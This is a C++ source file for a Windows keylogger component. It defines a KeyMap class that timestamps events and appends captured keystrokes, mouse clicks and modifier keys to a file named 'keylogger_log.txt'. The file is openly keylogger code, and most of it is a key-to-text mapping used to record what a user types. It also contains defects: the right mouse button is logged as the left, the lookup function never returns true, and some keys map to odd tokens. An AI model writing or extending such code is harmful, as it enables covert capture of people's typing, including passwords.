#define _CRT_SECURE_NO_WARNINGS
#include "KeyMap.h"


using namespace std;

#pragma once
string KeyMap::GetTime() {

	time_t     now = time(0);
	struct tm  tstruct;
	char       buf[80];
	tstruct = *localtime(&now);

	strftime(buf, sizeof(buf), "%Y-%m-%d.%X", &tstruct);
	std::string s(buf);
	return s;
}




void KeyMap::WriteData(string Text) {

	ofstream LogFile;
	LogFile.open("keylogger_log.txt", fstream::app);
	LogFile << Text << endl;
	LogFile.close();

}

bool KeyMap::isKeyListed(int vKey) {
	switch (vKey) {
	case VK_RETURN:
		WriteData("\n");
		break;
	case VK_OEM_1:
		WriteData("S-");
		break;
	case VK_OEM_7:
		WriteData("I-");
		break;
	case VK_OEM_5:
		WriteData("C-");
		break;
	case VK_OEM_2:
		WriteData("O-");
		break;
	case VK_BACK:
		WriteData("\b");
		break;
	case VK_SPACE:
		WriteData(" ");
		break;
	case VK_OEM_PERIOD:
		WriteData(".");
		break;
	case VK_NUMPAD0:
		WriteData("0");
		break;
	case VK_NUMPAD1:
		WriteData("1");
		break;
	case VK_NUMPAD2:
		WriteData("2");
		break;
	case VK_NUMPAD3:
		WriteData("3");
		break;
	case VK_NUMPAD4:
		WriteData("4");
		break;
	case VK_NUMPAD5:
		WriteData("5");
		break;
	case VK_NUMPAD6:
		WriteData("6");
		break;
	case VK_NUMPAD7:
		WriteData("7");
		break;
	case VK_NUMPAD8:
		WriteData("8");
		break;
	case VK_NUMPAD9:
		WriteData("9");
		break;
	case VK_TAB:
		WriteData("TAB");
		break;
	case VK_OEM_BACKTAB:
		WriteData("#BACKTAB#");
		break;
	case VK_LBUTTON:
		WriteData("#LEFT BUTTON(MOUSE)#");
		break;
	case VK_RBUTTON:
		WriteData("#LEFT BUTTON(MOUSE)#");
		break;
	case VK_CONTROL:
		WriteData("#CTRL#");
		break;
	case VK_MENU:
		WriteData("#ALT#");
		break;
	case VK_CAPITAL:
		WriteData("#CAPSLOCK#");
		break;
	case VK_ESCAPE:
		WriteData("#ESC#");
		break;
	case VK_DELETE:
		WriteData("#DELETE#");
		break;
	case VK_LSHIFT:
		WriteData("#LEFT SHIFT#");
		break;
	case VK_NUMLOCK:
		WriteData("#NUMLOCK#");
		break;
	case VK_RSHIFT:
		WriteData("#RIGHT SHIFT#");
		break;
	default: return false;
	}
}






